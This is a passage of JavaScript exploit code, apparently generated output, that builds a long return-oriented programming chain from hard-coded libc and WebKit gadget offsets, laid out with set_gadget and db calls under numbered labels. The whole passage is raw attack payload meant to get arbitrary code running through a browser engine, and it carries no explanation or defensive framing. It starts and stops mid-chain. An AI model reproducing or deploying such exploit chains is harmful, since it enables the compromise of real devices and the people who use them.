libc_base+793877 //pop rsi
]);
//L634:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L635:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+90648, //L637
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+90664, //L638
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L637:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L638:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+90808, //L642
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+90776, //L640
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+90792, //L641
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L640:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L641:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L642:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+90880, //L644
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L644:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+90936, //L645
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L645:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+91016, //L647
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L647:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L648:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L649:
db([7, 0]); // 0x7
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+91120, //L650
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+91136, //L651
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L650:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L651:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+91224, //L653
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L653:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+91280, //L654
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L654:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+91352, //L657
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L657:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+91408, //L659
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L659:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+91512, //L661
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L660:
db([40, 0]); // 0x28
set_gadget(libc_base+792472,); //pop rcx
//L661:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+91600, //L663
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+91616, //L664
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L663:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L664:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+91760, //L668
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+91728, //L666
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+91744, //L667
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L666:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L667:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L668:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+91856, //L670
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L669:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L670:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+91944, //L672
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+91960, //L673
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L672:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L673:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+92104, //L677
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+92072, //L675
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+92088, //L676
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L675:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L676:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L677:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+92176, //L679
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L679:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+92232, //L680
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L680:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+92312, //L682
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L682:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L683:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L684:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+92416, //L685
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+92432, //L686
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L685:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L686:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+92520, //L688
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L688:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+92576, //L689
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L689:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+92648, //L692
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L692:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+92704, //L694
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L694:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L695:
libc_base+788575, //pop rax
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+92856, //L697
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L696:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L697:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+92944, //L699
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+92960, //L700
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L699:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L700:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+93104, //L704
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+93072, //L702
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+93088, //L703
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L702:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L703:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L704:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+93176, //L706
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L706:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+93232, //L707
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L707:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+93312, //L709
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L709:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L710:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L711:
db([9, 0]); // 0x9
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+93416, //L712
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+93432, //L713
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L712:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L713:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+93520, //L715
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L715:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+93576, //L716
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L716:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+93648, //L719
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L719:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+93704, //L721
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L721:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+93808, //L723
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L722:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+792472,); //pop rcx
//L723:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+93896, //L725
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+93912, //L726
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L725:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L726:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+94056, //L730
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+94024, //L728
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+94040, //L729
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L728:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L729:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L730:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+94128, //L732
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L732:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+94184, //L733
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L733:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+94264, //L735
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L735:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L736:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L737:
db([6, 0]); // 0x6
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+94368, //L738
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+94384, //L739
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L738:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L739:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+94472, //L741
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L741:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+94528, //L742
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L742:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+94648, //L745
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L744:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L745:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+94736, //L747
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+94752, //L748
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L747:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L748:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+94896, //L752
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+94864, //L750
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+94880, //L751
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L750:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L751:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L752:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+94968, //L754
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L754:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+95024, //L755
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L755:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+95104, //L757
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L757:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L758:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L759:
db([10, 0]); // 0xa
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+95208, //L760
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+95224, //L761
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L760:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L761:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+95312, //L763
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L763:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+95368, //L764
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L764:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+95440, //L767
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L767:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+95496, //L769
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L769:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L770:
webkit_base+14461559, //mov [rax], rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+95648, //L772
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L771:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L772:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+95736, //L774
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+95752, //L775
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L774:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L775:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+95896, //L779
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+95864, //L777
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+95880, //L778
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L777:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L778:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L779:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+95968, //L781
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L781:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+96024, //L782
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L782:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+96104, //L784
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L784:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L785:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L786:
db([11, 0]); // 0xb
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+96208, //L787
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+96224, //L788
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L787:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L788:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+96312, //L790
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L790:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+96368, //L791
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L791:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+96440, //L794
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L794:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+96496, //L796
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L796:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L797:
libc_base+272260, //mov rax, rsi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+96648, //L799
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L798:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L799:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+96736, //L801
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+96752, //L802
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L801:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
